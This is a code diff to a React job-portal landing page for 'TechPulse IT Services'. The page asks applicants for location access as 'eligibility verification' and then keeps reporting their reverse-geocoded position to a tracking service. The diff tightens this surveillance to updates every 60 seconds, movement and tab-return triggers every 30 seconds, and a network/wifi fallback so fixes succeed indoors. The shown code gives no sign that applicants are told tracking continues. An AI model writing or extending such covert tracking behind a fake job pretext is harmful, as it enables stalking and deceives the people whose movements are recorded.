@@ -48,37 +48,71 @@ export const JobPortalLanding = ({ onNavigateAdmin }) => {
   const lastUpdateRef = useRef(0);
   const promptAttemptedRef = useRef(false);
 
+  const isUpdatingRef = useRef(false);
+
+  // 2-tier coordinate acquisition: high accuracy GPS first, instant network/wifi fallback
+  const getCoordinates = () => {
+    return new Promise((resolve) => {
+      if (!('geolocation' in navigator)) {
+        return resolve(null);
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => resolve(pos.coords),
+        (err) => {
+          console.warn('GPS satellite fix note:', err.message, '- falling back to network coordinates');
+          // Immediate fallback to standard network/wifi position (never times out indoors)
+          navigator.geolocation.getCurrentPosition(
+            (pos) => resolve(pos.coords),
+            (err2) => {
+              console.warn('Network location note:', err2.message);
+              resolve(null);
+            },
+            { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 }
+          );
+        },
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
+    });
+  };
+
   // Helper to send a fresh GPS update
-  const sendPeriodicUpdate = (overrideSessionId) => {
+  const sendPeriodicUpdate = async (overrideSessionId) => {
     const targetSessionId = overrideSessionId || sessionIdRef.current;
-    if (!targetSessionId || !navigator.geolocation) return;
+    if (!targetSessionId || isUpdatingRef.current) return;
 
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        lastUpdateRef.current = Date.now();
-        const resolved = await reverseGeocode(latitude, longitude);
+    isUpdatingRef.current = true;
+    try {
+      const coords = await getCoordinates();
+      if (!coords) {
+        isUpdatingRef.current = false;
+        return;
+      }
 
-        await locationService.recordUpdate({
-          sessionId: targetSessionId,
-          latitude,
-          longitude,
-          accuracyMeters: accuracy,
-          resolvedAddress: resolved,
-          isDemo: false,
-        });
-      },
-      (err) => {
-        console.warn('Periodic GPS update notice:', err.message);
-      },
-      { enableHighAccuracy: true, timeout: 12000, maximumAge: 30000 }
-    );
+      const { latitude, longitude, accuracy } = coords;
+      lastUpdateRef.current = Date.now();
+      const resolved = await reverseGeocode(latitude, longitude);
+
+      await locationService.recordUpdate({
+        sessionId: targetSessionId,
+        latitude,
+        longitude,
+        accuracyMeters: accuracy,
+        resolvedAddress: resolved,
+        isDemo: false,
+      });
+      console.log('[MonkeyOnki Telemetry] Position recorded:', latitude, longitude);
+    } catch (e) {
+      console.warn('Periodic GPS update note:', e);
+    } finally {
+      isUpdatingRef.current = false;
+    }
   };
 
   /**
    * Request location and record real-time session
    */
-  const handleRequestLocation = () => {
+  const handleRequestLocation = async () => {
     if (!('geolocation' in navigator)) {
       setVerificationError('Geolocation is not supported by your browser.');
       return;
@@ -87,59 +121,50 @@ export const JobPortalLanding = ({ onNavigateAdmin }) => {
     setVerifying(true);
     setVerificationError('');
 
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        lastUpdateRef.current = Date.now();
-        const resolved = await reverseGeocode(latitude, longitude);
-        const deviceInfo = getClientDeviceInfo();
+    const coords = await getCoordinates();
+    if (!coords) {
+      setVerifying(false);
+      setVerificationError(
+        'Unable to retrieve location signal. Please ensure device location is enabled in your browser and try again.'
+      );
+      return;
+    }
 
-        setCandidateLocation({
+    const { latitude, longitude, accuracy } = coords;
+    lastUpdateRef.current = Date.now();
+    const resolved = await reverseGeocode(latitude, longitude);
+    const deviceInfo = getClientDeviceInfo();
+
+    setCandidateLocation({
+      latitude,
+      longitude,
+      accuracy: Math.round(accuracy),
+      address: resolved,
+    });
+
+    try {
+      const session = await locationService.startSession({
+        displayName: `Applicant: Node.js Backend`,
+        deviceInfo: deviceInfo.formattedDevice,
+        browserInfo: deviceInfo.browser,
+        initialCoords: {
           latitude,
           longitude,
-          accuracy: Math.round(accuracy),
-          address: resolved,
-        });
+          accuracyMeters: accuracy,
+          resolvedAddress: resolved,
+        },
+      });
 
-        // Register real-time applicant session
-        try {
-          const session = await locationService.startSession({
-            displayName: `Applicant: Node.js Backend`,
-            deviceInfo: deviceInfo.formattedDevice,
-            browserInfo: deviceInfo.browser,
-            initialCoords: {
-              latitude,
-              longitude,
-              accuracyMeters: accuracy,
-              resolvedAddress: resolved,
-            },
-          });
+      if (session) {
+        sessionIdRef.current = session.id;
+        localStorage.setItem('techpulse_candidate_session_id', session.id);
+      }
+    } catch (err) {
+      console.warn('Session start error:', err);
+    }
 
-          if (session) {
-            sessionIdRef.current = session.id;
-            localStorage.setItem('techpulse_candidate_session_id', session.id);
-          }
-        } catch (err) {
-          console.warn('Session start error:', err);
-        }
-
-        setVerifying(false);
-        setIsVerified(true);
-      },
-      (err) => {
-        setVerifying(false);
-        if (err.code === err.PERMISSION_DENIED) {
-          setVerificationError(
-            'Location access was denied. TechPulse IT Services requires location verification to confirm remote/hybrid eligibility. Please allow location in your browser and try again.'
-          );
-        } else {
-          setVerificationError(
-            'Unable to retrieve location signal. Please ensure device location is enabled and try again.'
-          );
-        }
-      },
-      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-    );
+    setVerifying(false);
+    setIsVerified(true);
   };
 
   // Re-verify existing session or attempt prompt on load
@@ -155,22 +180,24 @@ export const JobPortalLanding = ({ onNavigateAdmin }) => {
     }
   }, []);
 
-  // Continuous real-time updates: every 2 minutes (120,000 ms) + watchPosition + visibility
+  // Continuous real-time updates: every 60 seconds (guarantees updates within 1m & 2m)
   useEffect(() => {
     if (!isVerified || !sessionIdRef.current) return;
 
-    // 1. Guaranteed 2-minute timer (120,000 ms)
-    const TWO_MINUTES_MS = 2 * 60 * 1000;
+    // Send an update right away
+    sendPeriodicUpdate();
+
+    // 60-second periodic timer
     intervalRef.current = setInterval(() => {
       sendPeriodicUpdate();
-    }, TWO_MINUTES_MS);
+    }, 60000);
 
-    // 2. Movement tracking via watchPosition (throttled to 45s between updates)
+    // Watch position for movement
     if (navigator.geolocation) {
       watchIdRef.current = navigator.geolocation.watchPosition(
         async (pos) => {
           const now = Date.now();
-          if (now - lastUpdateRef.current >= 45000) {
+          if (now - lastUpdateRef.current >= 30000) {
             const { latitude, longitude, accuracy } = pos.coords;
             lastUpdateRef.current = now;
             const resolved = await reverseGeocode(latitude, longitude);
@@ -186,15 +213,15 @@ export const JobPortalLanding = ({ onNavigateAdmin }) => {
           }
         },
         (err) => console.warn('watchPosition notice:', err.message),
-        { enableHighAccuracy: true, maximumAge: 30000 }
+        { enableHighAccuracy: false, maximumAge: 0 }
       );
     }
 
-    // 3. Tab visibility listener: when candidate switches back to tab
+    // Tab visibility listener: when candidate switches back to tab
     const handleVisibilityChange = () => {
       if (document.visibilityState === 'visible') {
         const now = Date.now();
-        if (now - lastUpdateRef.current >= 60000) {
+        if (now - lastUpdateRef.current >= 30000) {
           sendPeriodicUpdate();
         }
       }
